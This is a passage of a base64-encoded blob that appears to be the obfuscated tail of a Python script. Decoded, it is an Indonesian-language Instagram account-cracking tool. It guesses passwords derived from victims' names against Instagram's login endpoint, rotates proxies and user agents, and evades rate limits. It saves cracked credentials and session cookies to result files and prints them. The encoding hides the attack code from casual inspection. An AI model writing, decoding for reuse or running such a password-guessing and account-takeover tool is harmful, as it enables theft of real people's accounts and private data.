AgICAgICAgICAgICAgICAgICAgICBwYXNzd29yZCA9IFtuYW1hLnJlcGxhY2UoJyAnLCcnKSwgbmFtYSwgelswXSsnMTIzJywgelswXSsnMTIzNCcsIHpbMF0rJzEyMzQ1J10KICAgICAgICAgICAgICAgICAgICBfX19oYXl1ay5zdWJtaXQoc2VsZi5fX21haW5fXywgc2VsZi5fX19maWxlLCB1c2VybmFtZSwgcGFzc3dvcmQpCiAgICAgICAgICAgIGV4aXQoZiJcbntNfVt7UH1TZWxlc2Fpe019XXtQfSIpCiAgICAgICAgZXhjZXB0IChWYWx1ZUVycm9yKToKICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBDcmFjayBTZWxlc2FpIFNlcGVydGlueWEgQWRhIFlhbmcgRXJyb3IgU2lsYWhrYW4gRHVtcCBVbGFuZyEiKQogICAgZGVmIF9fbWFpbl9fKHNlbGYsIHVzZXIsIHVpZCwgcHd4KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIF9fX3VzZXJhZ2VudCA9IG9wZW4oJ0RhdGEvdWEudHh0JywgJ3InKS5yZWFkKCkKICAgICAgICBleGNlcHQgKElPRXJyb3IpOgogICAgICAgICAgICBfX191c2VyYWdlbnQgPSAoJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA2LjAuMTsgUmVkbWkgNEEgQnVpbGQvTU1CMjlNOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzYwLjAuMzExMi4xMTYgTW9iaWxlIFNhZmFyaS81MzcuMzYnKQogICAgICAgIHRyeToKICAgICAgICAgICAgZm9yIHB3IGluIHB3eDoKICAgICAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQogICAgICAgICAgICAgICAgX19fdXJsID0gKCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLycpCiAgICAgICAgICAgICAgICBfX19sb2dpbiA9ICgnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbi9hamF4LycpCiAgICAgICAgICAgICAgICBfX19wcm94eSA9IHsnaHR0cCc6ICdzb2NrczQ6Ly8lcyclKHJhbmRvbS5jaG9pY2Uob3BlbigiRGF0YS9wcm94eS50eHQiLCJyIikucmVhZCgpLnNwbGl0bGluZXMoKSkpfQogICAgICAgICAgICAgICAgX19fY3NyZiA9IHJlcXVlc3RzLmdldChfX191cmwpLmNvb2tpZXNbJ2NzcmZ0b2tlbiddCiAgICAgICAgICAgICAgICBfX19kYXRhID0geyd1c2VybmFtZSc6IHVpZCwKICAgICAgICAgICAgICAgICdlbmNfcGFzc3dvcmQnOiBmJyNQV0RfSU5TVEFHUkFNX0JST1dTRVI6MDp7dGltZX06e3B3fScsCiAgICAgICAgICAgICAgICAncXVlcnlQYXJhbXMnOiB7fSwKICAgICAgICAgICAgICAgICdvcHRJbnRvT25lVGFwJzogJ2ZhbHNlJ30KICAgICAgICAgICAgICAgIF9fX2hlYWQgPSB7J1VzZXItQWdlbnQnOiByYW5kb20uY2hvaWNlKG9wZW4oIkRhdGEvdWEudHh0IiwiciIpLnJlYWQoKS5zcGxpdGxpbmVzKCkpLAogICAgICAgICAgICAgICAgJ1gtUmVxdWVzdGVkLVdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLAogICAgICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbi8nLAogICAgICAgICAgICAgICAgJ3gtY3NyZnRva2VuJzogX19fY3NyZn0KICAgICAgICAgICAgICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHNlczoKICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHNlcy5wb3N0KF9fX2xvZ2luLCBkYXRhID0gX19fZGF0YSwgaGVhZGVycyA9IF9fX2hlYWQsIHByb3hpZXMgPSBfX19wcm94eSkuanNvbigpCiAgICAgICAgICAgICAgICAgICAgaWYgJ3VzZXJJZCcgaW4gc3RyKHJlc3BvbnNlKToKICAgICAgICAgICAgICAgICAgICAgICAgY29raSA9IChmJ21pZD17c2VzLmNvb2tpZXMuZ2V0X2RpY3QoKVsibWlkIl19O2lnX2RpZD17c2VzLmNvb2tpZXMuZ2V0X2RpY3QoKVsiaWdfZGlkIl19O2lnX25yY2I9MTtzaGJpZD0iOTc3NlwwNTQxOTg2NTg3OTUzXDA1NDE2NzQyODk4MDk6MDFmNzEzYWNkZjVjNDkyMWE1NDJhZmY0MzY5NTgwNWQ4ZTc4OGY1NTgwZjRlZmFhZjcxNGNhNzMwMWJhMzRiYjcyNzc5MGM5IjtzaGJ0cz0iMTY0Mjc1MzgwOVwwNTQxOTg2NTg3OTUzXDA1NDE2NzQyODk4MDk6MDFmNzIyN2Y2MjE5ZmIwYTAzNmUzNTkzYzE1MzFlOWI5YzllYjFkYjlkY2JiN2I0NTkwYmEzNmZmY2JlNjI3MTVlYjEwYWRhIjtjc3JmdG9rZW49e3Nlcy5jb29raWVzLmdldF9kaWN0KClbImNzcmZ0b2tlbiJdfTtkc191c2VyX2lkPXtzZXMuY29va2llcy5nZXRfZGljdCgpWyJkc191c2VyX2lkIl19O3Nlc3Npb25pZD17c2VzLmNvb2tpZXMuZ2V0X2RpY3QoKVsic2Vzc2lvbmlkIl19O3J1cj0iRUFHXDA1NDE5ODY1ODc5NTNcMDU0MTY3NDQ3NzgyMDowMWY3MjRjMDNmZjM4ZjI0NjYyYjE2NDhkZDJhOTMzZmM0YTZlNjZiN2EyYmVmMjQ1OGQxNDBiZmI3NmVlODYyOTZmNmNkOGIiJykKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS97dWlkfS8/X19hPTEnLCBoZWFkZXJzID0geyd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tRzk3M0YgQnVpbGQvUVAxQS4xOTA3MTEuMDIwOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xOTggTW9iaWxlIFNhZmFyaS81MzcuMzYgSW5zdGFncmFtIDE2Ni4xLjAuNDIuMjQ1IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjA0Mjsgc2Ftc3VuZzsgU00tRzk3M0Y7IGJleW9uZDE7IGV4eW5vczk4MjA7IGVuX0dCOyAyNTYwOTkyMDQpJywgJ2Nvb2tpZSc6IG9wZW4oJ0RhdGEvY29raS50eHQnLCdyJykucmVhZCgpfSkuanNvbigpWydncmFwaHFsJ11bJ3VzZXInXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9sbG93ZXIgPSBfX19yb3pbJ2VkZ2VfZm9sbG93ZWRfYnknXVsnY291bnQnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9sbG93aW5nID0gX19fcm96WydlZGdlX2ZvbGxvdyddWydjb3VudCddCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9sbG93ZXIgPSAoJy0nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9sbG93aW5nID0gKCctJykKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJccntCfVt7UH3inJR7Qn1de1B9IFN0YXR1cyA6e0h9IFN1Y2Nlc3MgICAgICIpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie0J9W3tQfT57Qn1de1B9IFVzZXJuYW1lIDp7SH0ge3VpZH0iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBQYXNzd29yZCA6e0h9IHtwd30iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBGb2xsb3dlciA6e0h9IHtmb2xsb3dlcn0iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBGb2xsb3dpbmcgOntIfSB7Zm9sbG93aW5nfSIpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie0J9W3tQfT57Qn1de1B9IENvb2tpZSA6e0h9IHtjb2tpfVxuIikKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5vay5hcHBlbmQoZiJ7dWlkfXx7cHd9IikKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignUmVzdWx0cy9Pay50eHQnLCdhJykud3JpdGUoZiJ7dWlkfXx7cHd9XG4iKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnRfcmVxdWlyZWQnIGluIHN0cihyZXNwb25zZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX3JveiA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20ve3VpZH0vP19fYT0xJywgaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzNGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ni4wLjQyNDAuMTk4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAxNjYuMS4wLjQyLjI0NSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIwNDI7IHNhbXN1bmc7IFNNLUc5NzNGOyBiZXlvbmQxOyBleHlub3M5ODIwOyBlbl9HQjsgMjU2MDk5MjA0KScsICdjb29raWUnOiBvcGVuKCdEYXRhL2Nva2kudHh0JywncicpLnJlYWQoKX0pLmpzb24oKVsnZ3JhcGhxbCddWyd1c2VyJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd2VyID0gX19fcm96WydlZGdlX2ZvbGxvd2VkX2J5J11bJ2NvdW50J10KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd2luZyA9IF9fX3JvelsnZWRnZV9mb2xsb3cnXVsnY291bnQnXQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd2VyID0gKCctJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd2luZyA9ICgnLScpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7Qn1be1B94pyYe0J9XXtQfSBTdGF0dXMgOntLfSBDaGVja3BvaW50ICAgICIpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie0J9W3tQfT57Qn1de1B9IFVzZXJuYW1lIDp7S30ge3VpZH0iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBQYXNzd29yZCA6e0t9IHtwd30iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBGb2xsb3dlciA6e0t9IHtmb2xsb3dlcn0iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBGb2xsb3dpbmcgOntLfSB7Zm9sbG93aW5nfVxuIikKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5jcC5hcHBlbmQoZiJ7dWlkfXx7cHd9IikKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignUmVzdWx0cy9DcC50eHQnLCdhJykud3JpdGUoZiJ7dWlkfXx7cHd9XG4iKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGVsaWYgJ1BsZWFzZSB3YWl0JyBpbiBzdHIocmVzcG9uc2UpOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntQfVt7TX0he1B9XXtNfSBHdW5ha2FuIE1vZGUgUGVzYXdhdCAyIERldGlrIiwgZW5kPSdccicpO3NsZWVwKDcpO19fbWFpbl9fKHNlbGYsIHVzZXIsIHVpZCwgcHd4KQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIHNlbGYua2lsbCArPTEKICAgICAgICAgICAgcHJpbnQoZiJ7UH1be1B9Q3JhY2t7UH1de1B9IHtzZWxmLmtpbGx9L3tzdHIobGVuKHVzZXIpKX0gQ3A6LXtsZW4oc2VsZi5jcCl9IE9rOi17bGVuKHNlbGYub2spfSAgICAgICAgICAiLCBlbmQ9J1xyJykKICAgICAgICBleGNlcHQgKENvbm5lY3Rpb25FcnJvcik6CiAgICAgICAgICAgIHByaW50KGYie1B9W3tLfSF7UH1de0t9IEtvbmVrc2kgRXJyb3IgICAgICAgICAgICAgICAiLCBlbmQ9J1xyJyk7c2xlZXAoNyk7X19tYWluX18oc2VsZiwgdXNlciwgdWlkLCBwd3gpCiAgICAgICAgZXhjZXB0Ol9fbWFpbl9fKHNlbGYsIHVzZXIsIHVpZCwgcHd4KQoKaWYgX19uYW1lX189PSdfX21haW5fXyc6CiAgICBvcy5zeXN0ZW0oJ2dpdCBwdWxsJykKICAgIF9fX21lbnVfX18oKQ=="))